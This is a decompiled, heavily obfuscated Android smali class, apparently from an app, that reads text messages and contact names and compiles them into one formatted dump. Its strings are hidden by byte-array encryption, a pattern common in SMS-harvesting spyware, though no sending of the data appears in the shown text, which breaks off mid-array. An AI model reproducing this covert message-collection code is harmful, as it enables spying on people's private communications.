.class public abstract Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v80;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 25

    .line 1
    move-object/from16 v0, p1

    const-string v1, " "

    const-string v2, "\n"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    const/16 v6, 0xe

    :try_start_0
    new-array v6, v6, [B

    fill-array-data v6, :array_0

    const/16 v7, 0x8

    new-array v8, v7, [B

    fill-array-data v8, :array_1

    invoke-static {v6, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    const/4 v8, 0x5

    new-array v9, v8, [B

    fill-array-data v9, :array_2

    new-array v10, v7, [B

    fill-array-data v10, :array_3

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    const/4 v10, 0x4

    if-eqz v9, :cond_0

    const/16 v0, 0x13

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v6, v7, [B

    fill-array-data v6, :array_5

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_0
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    goto :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_a

    :cond_0
    new-array v9, v10, [B

    fill-array-data v9, :array_6

    new-array v11, v7, [B

    fill-array-data v11, :array_7

    invoke-static {v9, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/16 v0, 0x12

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v6, v7, [B

    fill-array-data v6, :array_9

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    :goto_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v11

    const/4 v9, 0x7

    new-array v13, v9, [Ljava/lang/String;

    const/4 v15, 0x3

    new-array v0, v15, [B

    fill-array-data v0, :array_a

    new-array v12, v7, [B

    fill-array-data v12, :array_b

    invoke-static {v0, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v14, 0x0

    aput-object v0, v13, v14

    const/16 v0, 0x9

    new-array v12, v0, [B

    fill-array-data v12, :array_c

    new-array v14, v7, [B

    fill-array-data v14, :array_d

    invoke-static {v12, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    const/4 v14, 0x1

    aput-object v12, v13, v14

    new-array v12, v9, [B

    fill-array-data v12, :array_e

    new-array v14, v7, [B

    fill-array-data v14, :array_f

    invoke-static {v12, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    const/4 v14, 0x2

    aput-object v12, v13, v14

    const/4 v12, 0x6

    new-array v14, v12, [B

    fill-array-data v14, :array_10

    new-array v0, v7, [B

    fill-array-data v0, :array_11

    invoke-static {v14, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v13, v15

    new-array v0, v10, [B

    fill-array-data v0, :array_12

    new-array v14, v7, [B

    fill-array-data v14, :array_13

    invoke-static {v0, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v13, v10

    new-array v0, v10, [B

    fill-array-data v0, :array_14

    new-array v14, v7, [B

    fill-array-data v14, :array_15

    invoke-static {v0, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v13, v8

    new-array v0, v10, [B

    fill-array-data v0, :array_16

    new-array v14, v7, [B

    fill-array-data v14, :array_17

    invoke-static {v0, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v13, v12

    const/4 v14, 0x0

    const/4 v0, 0x0

    const/16 v18, 0x0

    move v8, v12

    move-object v12, v6

    const/4 v10, 0x0

    move-object v15, v0

    move-object/from16 v16, v18

    invoke-virtual/range {v11 .. v16}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v11

    new-array v12, v9, [Ljava/lang/String;

    new-array v0, v9, [B

    fill-array-data v0, :array_18

    new-array v13, v7, [B

    fill-array-data v13, :array_19

    invoke-static {v0, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v12, v10

    new-array v0, v8, [B

    fill-array-data v0, :array_1a

    new-array v13, v7, [B

    fill-array-data v13, :array_1b

    invoke-static {v0, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v13, 0x1

    aput-object v0, v12, v13

    const/4 v14, 0x4

    new-array v0, v14, [B

    fill-array-data v0, :array_1c

    new-array v14, v7, [B

    fill-array-data v14, :array_1d

    invoke-static {v0, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v14, 0x2

    aput-object v0, v12, v14

    const/4 v15, 0x4

    new-array v0, v15, [B

    fill-array-data v0, :array_1e

    new-array v15, v7, [B

    fill-array-data v15, :array_1f

    invoke-static {v0, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v15, 0x3

    aput-object v0, v12, v15

    new-array v0, v15, [B

    fill-array-data v0, :array_20

    new-array v9, v7, [B

    fill-array-data v9, :array_21

    invoke-static {v0, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v9, 0x4

    aput-object v0, v12, v9

    new-array v0, v9, [B

    fill-array-data v0, :array_22

    new-array v9, v7, [B

    fill-array-data v9, :array_23

    invoke-static {v0, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v9, 0x5

    aput-object v0, v12, v9

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_24

    new-array v9, v7, [B

    fill-array-data v9, :array_25

    invoke-static {v0, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v12, v8

    if-eqz v11, :cond_7

    invoke-interface {v11}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_7

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v19

    sget-object v20, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v21, 0x0

    const/16 v0, 0x32

    new-array v0, v0, [B

    fill-array-data v0, :array_26

    new-array v9, v7, [B

    fill-array-data v9, :array_27

    invoke-static {v0, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v22

    new-array v0, v14, [Ljava/lang/String;

    const/16 v9, 0x20

    new-array v8, v9, [B

    fill-array-data v8, :array_28

    new-array v15, v7, [B

    fill-array-data v15, :array_29

    invoke-static {v8, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v0, v10

    new-array v8, v9, [B

    fill-array-data v8, :array_2a

    new-array v9, v7, [B

    fill-array-data v9, :array_2b

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v0, v13

    const/16 v8, 0xa

    new-array v8, v8, [B

    fill-array-data v8, :array_2c

    new-array v9, v7, [B

    fill-array-data v9, :array_2d

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v24

    move-object/from16 v23, v0

    invoke-virtual/range {v19 .. v24}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    const/4 v9, 0x0

    :goto_2
    if-eqz v0, :cond_2

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v15

    if-eqz v15, :cond_2

    const/16 v9, 0xc

    new-array v9, v9, [B

    fill-array-data v9, :array_2e

    new-array v15, v7, [B

    fill-array-data v15, :array_2f

    invoke-static {v9, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v0, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v0, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    const/4 v15, 0x5

    new-array v8, v15, [B

    fill-array-data v8, :array_30

    new-array v15, v7, [B

    fill-array-data v15, :array_31

    invoke-static {v8, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v0, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v0, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {v5, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_2
    if-eqz v0, :cond_3

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    :cond_3
    move v8, v10

    :goto_3
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_7

    aget-object v0, v12, v10

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    aget-object v0, v12, v14

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    const/16 v17, 0x3

    aget-object v0, v12, v17

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v11, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    new-instance v10, Ljava/util/Date;

    invoke-direct {v10, v13, v14}, Ljava/util/Date;-><init>(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    invoke-virtual {v4, v15}, Ljava/util/ArrayList;->indexOf(Ljava/lang/Object;)I

    move-result v0

    const/4 v13, -0x1

    if-eq v0, v13, :cond_4

    invoke-virtual {v5, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :catch_1
    move-exception v0

    goto :goto_5

    :cond_4
    const/4 v0, 0x0

    :goto_4
    move-object v9, v0

    goto :goto_6

    :goto_5
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_6
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v13, 0xf

    if-le v0, v13, :cond_5

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v14, 0x0

    invoke-virtual {v7, v14, v13}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v13, 0x3

    new-array v14, v13, [B

    fill-array-data v14, :array_32

    move-object/from16 v21, v4

    const/16 v13, 0x8

    new-array v4, v13, [B

    fill-array-data v4, :array_33

    invoke-static {v14, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_7

    :cond_5
    move-object/from16 v21, v4

    move-object v0, v7

    :goto_7
    const/16 v4, 0x69

    new-array v4, v4, [B

    fill-array-data v4, :array_34

    const/16 v13, 0x8

    new-array v14, v13, [B

    fill-array-data v14, :array_35

    invoke-static {v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const/4 v13, 0x7

    new-array v14, v13, [Ljava/lang/Object;

    const/16 v18, 0x0

    aput-object v15, v14, v18

    if-eqz v9, :cond_6

    move-object/from16 v22, v5

    move-object v5, v9

    :goto_8
    const/4 v13, 0x1

    goto :goto_9

    :cond_6
    const/4 v15, 0x6

    new-array v13, v15, [B

    fill-array-data v13, :array_36

    move-object/from16 v22, v5

    const/16 v15, 0x8

    new-array v5, v15, [B

    fill-array-data v5, :array_37

    invoke-static {v13, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    goto :goto_8

    :goto_9
    aput-object v5, v14, v13

    invoke-virtual {v10}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v10, 0x2

    aput-object v5, v14, v10

    new-array v5, v13, [B

    const/16 v10, 0x73

    const/4 v13, 0x0

    aput-byte v10, v5, v13

    const/16 v10, 0x8

    new-array v13, v10, [B

    fill-array-data v13, :array_38

    invoke-static {v5, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v13, 0x2

    new-array v15, v13, [B

    fill-array-data v15, :array_39

    new-array v13, v10, [B

    fill-array-data v13, :array_3a

    invoke-static {v15, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v5, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v2, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const/4 v5, 0x3

    aput-object v0, v14, v5

    const/4 v10, 0x1

    new-array v0, v10, [B

    const/16 v13, 0x75

    const/4 v15, 0x0

    aput-byte v13, v0, v15

    const/16 v13, 0x8

    new-array v5, v13, [B

    fill-array-data v5, :array_3b

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v5, 0x2

    new-array v10, v5, [B

    fill-array-data v10, :array_3c

    new-array v5, v13, [B

    fill-array-data v5, :array_3d

    invoke-static {v10, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v0, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v2, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const/4 v5, 0x4

    aput-object v0, v14, v5

    invoke-virtual {v6}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v0

    const/4 v7, 0x5

    aput-object v0, v14, v7

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v10, 0x6

    aput-object v0, v14, v10

    invoke-static {v4, v14}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v8, v8, 0x1

    move v7, v13

    move v10, v15

    move-object/from16 v4, v21

    move-object/from16 v5, v22

    const/4 v13, 0x1

    const/4 v14, 0x2

    goto/16 :goto_3

    :cond_7
    if-eqz v11, :cond_8

    invoke-interface {v11}, Landroid/database/Cursor;->close()V

    :cond_8
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_b

    :goto_a
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    const-string v0, ""

    :goto_b
    return-object v0

    :array_0
    .array-data 1
        -0x2ct
        0x3ft
        -0x73t
        -0x29t
        -0x51t
        -0x6t
        0x33t
        -0x5et
        -0x68t
        0x7ft
        -0x70t
        -0x32t
        -0x47t
        -0x45t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x49t
        0x50t
        -0x1dt
        -0x5dt
        -0x36t
        -0x6ct
        0x47t
        -0x68t
    .end array-data

    :array_2
    .array-data 1
        -0x33t
        0x6ft
        -0x67t
        -0x2bt
        -0x66t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x7ct
        0x1t
        -0x5t
        -0x46t
        -0x1et
        -0x3t
        -0x4bt
        0x43t
    .end array-data

    :array_4
    .array-data 1
        -0xet
        -0x3ct
        -0x9t
        0x50t
        -0x34t
        0x62t
        -0x4bt
        0x2at
        -0x42t
        -0x7ct
        -0x16t
        0x49t
        -0x26t
        0x23t
        -0x58t
        0x7et
        -0xdt
        -0x3ct
        -0x1ft
    .end array-data

    :array_5
    .array-data 1
        -0x6ft
        -0x55t
        -0x67t
        0x24t
        -0x57t
        0xct
        -0x3ft
        0x10t
    .end array-data

    :array_6
    .array-data 1
        0x39t
        0x4et
        0x5t
        0x52t
    .end array-data

    :array_7
    .array-data 1
        0x6at
        0x2bt
        0x6bt
        0x26t
        -0x3bt
        0x20t
        0x35t
        -0xft
    .end array-data

    :array_8
    .array-data 1
        0x19t
        0x7at
        0x71t
        0x68t
        -0x37t
        0x43t
        -0x27t
        -0x65t
        0x55t
        0x3at
        0x6ct
        0x71t
        -0x21t
        0x2t
        -0x22t
        -0x3ct
        0x14t
        0x61t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x7at
        0x15t
        0x1ft
        0x1ct
        -0x54t
        0x2dt
        -0x53t
        -0x5ft
    .end array-data

    :array_a
    .array-data 1
        -0x68t
        -0x27t
        0xft
    .end array-data

    :array_b
    .array-data 1
        -0x39t
        -0x50t
        0x6bt
        -0x4dt
        0x50t
        -0x2dt
        -0x17t
        -0x4bt
    .end array-data

    :array_c
    .array-data 1
        0x1ft
        0x45t
        0x3dt
        0x68t
        -0x75t
        -0x70t
        0x73t
        0x55t
        0xft
    .end array-data

    nop

    :array_d
    .array-data 1
        0x6bt
        0x2dt
        0x4ft
        0xdt
        -0x16t
        -0xct
        0x2ct
        0x3ct
    .end array-data

    :array_e
    .array-data 1
        -0x35t
        -0x54t
        0x37t
        0xct
        0x2at
        -0x2dt
        -0x6bt
    .end array-data

    :array_f
    .array-data 1
        -0x56t
        -0x38t
        0x53t
        0x7et
        0x4ft
        -0x60t
        -0x1at
        0x5t
    .end array-data

    :array_10
    .array-data 1
        -0x3et
        -0x38t
        0x4ct
        -0x64t
        -0x7dt
        0x55t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x4et
        -0x53t
        0x3et
        -0x11t
        -0x14t
        0x3bt
        0x1bt
        -0x4t
    .end array-data

    :array_12
    .array-data 1
        -0x43t
        -0x40t
        0x13t
        0x42t
    .end array-data

    :array_13
    .array-data 1
        -0x27t
        -0x5ft
        0x67t
        0x27t
        0x23t
        -0x2bt
        0x6ft
        0x8t
    .end array-data

    :array_14
    .array-data 1
        0xct
        -0x63t
        -0x5ft
        -0xat
    .end array-data

    :array_15
    .array-data 1
        0x6et
        -0xet
        -0x3bt
        -0x71t
        0x4ft
        0x1bt
        -0x55t
        0x78t
    .end array-data

    :array_16
    .array-data 1
        0x1ft
        -0x65t
        -0x3et
        0xbt
    .end array-data

    :array_17
    .array-data 1
        0x6bt
        -0x1et
        -0x4et
        0x6et
        0x10t
        0x45t
        0x64t
        0x1et
    .end array-data

    :array_18
    .array-data 1
        0x2et
        -0x34t
        0xat
        0x14t
        -0x18t
        0x1ft
        0x69t
    .end array-data

    :array_19
    .array-data 1
        0x4ft
        -0x58t
        0x6et
        0x66t
        -0x73t
        0x6ct
        0x1at
        0x5t
    .end array-data

    :array_1a
    .array-data 1
        0xat
        0x19t
        -0x4t
        0x69t
        0x1et
        0x5ft
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x7at
        0x7ct
        -0x72t
        0x1at
        0x71t
        0x31t
        0x6t
        0x1at
    .end array-data

    :array_1c
    .array-data 1
        -0x40t
        0x27t
        -0x21t
        -0x60t
    .end array-data

    :array_1d
    .array-data 1
        -0x5ct
        0x46t
        -0x55t
        -0x3bt
        0x4bt
        0x73t
        0x6at
        -0x3bt
    .end array-data

    :array_1e
    .array-data 1
        -0x72t
        -0x32t
        -0x48t
        0x51t
    .end array-data

    :array_1f
    .array-data 1
        -0x14t
        -0x5ft
        -0x24t
        0x28t
        -0xct
        0x23t
        0x42t
        -0x4ct
    .end array-data

    :array_20
    .array-data 1
        -0x24t
        -0x9t
        -0x3ct
    .end array-data

    :array_21
    .array-data 1
        -0x7dt
        -0x62t
        -0x60t
        0x68t
        -0x12t
        -0xdt
        -0x73t
        -0x14t
    .end array-data

    :array_22
    .array-data 1
        0x23t
        0x7at
        -0x7bt
        -0x73t
    .end array-data

    :array_23
    .array-data 1
        0x57t
        0x3t
        -0xbt
        -0x18t
        0x33t
        0x6bt
        0x39t
        0x73t
    .end array-data

    :array_24
    .array-data 1
        0xat
        -0x23t
        0x44t
        0x41t
        0x1dt
        -0x6at
        0x72t
        -0x67t
        0x1at
    .end array-data

    nop

    :array_25
    .array-data 1
        0x7et
        -0x4bt
        0x36t
        0x24t
        0x7ct
        -0xet
        0x2dt
        -0x10t
    .end array-data

    :array_26
    .array-data 1
        0x75t
        0x73t
        0x30t
        -0xet
        -0x7at
        -0x48t
        -0x57t
        -0x5dt
        0x78t
        0x4dt
        0x2dt
        -0x28t
        -0x65t
        -0x4et
        -0x5dt
        -0x41t
        0x3ct
        0x2ft
        0x73t
        -0x73t
        -0x49t
        -0x62t
        -0x7et
        -0x13t
        0x35t
        0x7ft
        0x2at
        -0x40t
        -0x6dt
        -0x5ct
        -0x41t
        -0x43t
        0x78t
        0x2ft
        0x7ct
        -0x73t
        -0x47t
        -0x7et
        -0x1at
        -0x60t
        0x74t
        0x7ft
        0x26t
        -0x27t
        -0x71t
        -0x60t
        -0x5dt
        -0x10t
        0x22t
        0x3bt
    .end array-data

    nop

    :array_27
    .array-data 1
        0x1dt
        0x12t
        0x43t
        -0x53t
        -0xat
        -0x30t
        -0x3at
        -0x33t
    .end array-data

    :array_28
    .array-data 1
        -0x73t
        -0x19t
        -0x1ft
        -0x23t
        -0x64t
        0x49t
        0x76t
        0x2t
        -0x6ct
        -0x20t
        -0x1ft
        -0x23t
        -0x62t
        0x52t
        0x60t
        0x3t
        -0x6ct
        -0x5t
        -0x55t
        -0x66t
        -0x77t
        0x42t
        0x7ft
        0x5ft
        -0x62t
        -0x1ct
        -0x1ct
        -0x66t
        -0x6ft
        0x78t
        0x64t
        0x42t
    .end array-data

    :array_29
    .array-data 1
        -0x5t
        -0x77t
        -0x7bt
        -0xdt
        -0x3t
        0x27t
        0x12t
        0x70t
    .end array-data

    :array_2a
    .array-data 1
        -0x63t
        0x44t
        0x30t
        0x67t
        -0x5at
        -0x70t
